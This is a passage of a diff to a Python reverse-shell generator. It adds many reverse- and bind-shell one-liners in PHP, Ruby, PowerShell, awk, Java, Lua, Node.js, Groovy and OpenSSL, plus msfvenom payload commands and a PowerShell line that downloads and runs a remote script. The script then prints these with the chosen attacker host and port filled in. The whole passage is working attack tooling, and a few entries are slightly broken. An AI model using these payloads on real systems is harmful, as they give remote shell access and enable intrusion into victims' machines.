+    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");' ''')
+    add_shell(revshells, 'php', '''php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}' ''')
+    add_shell(revshells, 'ruby', '''ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''')
+    add_shell(revshells, 'ruby', '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
+    add_shell(shells_dict=revshells, type='ruby', notes='Windows', shell='''ruby -rsocket -e 'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
+    add_shell(revshells, 'openssl', '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s''')
+    add_shell(shells_dict=revshells, type='openssl', notes='Listener (attacker)', shell='''ncat --ssl -vv -l -p {LPORT}''')
+    add_shell(revshells, 'powershell', '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''')
+    add_shell(revshells, 'powershell', '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''')
+    add_shell(revshells, 'powershell', '''powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')''')
+    add_shell(revshells, 'awk', '''awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''')
+    add_shell(revshells, 'tclsh', '''echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh''')
+    add_shell(revshells, 'java', '''r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()''')
+    add_shell(revshells, 'java', '''String host="{LPORT}";
+int port={LPORT};
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
+    add_shell(shells_dict=revshells, type='java', notes='More stealthy', shell='''Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();''')
+    add_shell(revshells, 'war', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file''')
+    add_shell(shells_dict=revshells, type='lua', notes='Linux', shell='''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''')
+    add_shell(shells_dict=revshells, type='lua', notes='Windows', shell='''lua5.1 -e 'local host, port = "{LHOST}", {LPORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')
+    add_shell(revshells, 'nodejs', '''require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')''')
+    add_shell(revshells, 'nodejs', '''-var x = global.process.mainModule.require
+-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')''')
+    add_shell(revshells, 'nodejs', '''(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect({LPORT}, "{LHOST}", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();''')
+    add_shell(revshells, 'groovy', '''String host="{LHOST}";
+int port={LPORT};
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
+    add_shell(shells_dict=revshells, type='groovy', notes='More stealthy', shell='''Thread.start {        // Reverse shell here        }''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT=4242 -f elf > shell.elf''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT=4242 -f exe > shell.exe''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT=4242 -f macho > shell.macho''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4242 -f exe > reverse.exe''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4242 -f exe > reverse.exe''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4242 -f elf >reverse.elf''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT=4242 -f elf >reverse.elf''')
+
+    add_shell(bindshells, 'netcat', '''nc -lvp {LPORT} -e /bin/sh''')
 
 if __name__ == '__main__':
     print()
@@ -177,9 +175,10 @@ if __name__ == '__main__':
     populate_shells()
     options = get_options()
     shells_dict = globals()[options.SHELLTYPE]
-    for encoded_shell in shells_dict[options.TYPE]:
-        shell = gen_shell()
-        notes = search_notes()
-        notes_length = len(notes) - shell.count('<note>')
-        shell_index = shells_dict[options.TYPE].index(encoded_shell) + 1
-        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + ']' + Style.RESET_ALL + ' ' + notes + shell[notes_length:] + '\n')
+    for notes, shell in shells_dict[options.TYPE]:
+        shell_index = shells_dict[options.TYPE].index((notes, shell)) + 1
+        print_shell = shell.replace('{LHOST}', options.LHOST).replace('{LPORT}', options.LPORT).strip()
+        print_notes = ''
+        if notes is not None:
+            print_notes = notes + ' '
+        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + '] ' + print_notes + Style.RESET_ALL + print_shell + '\n')
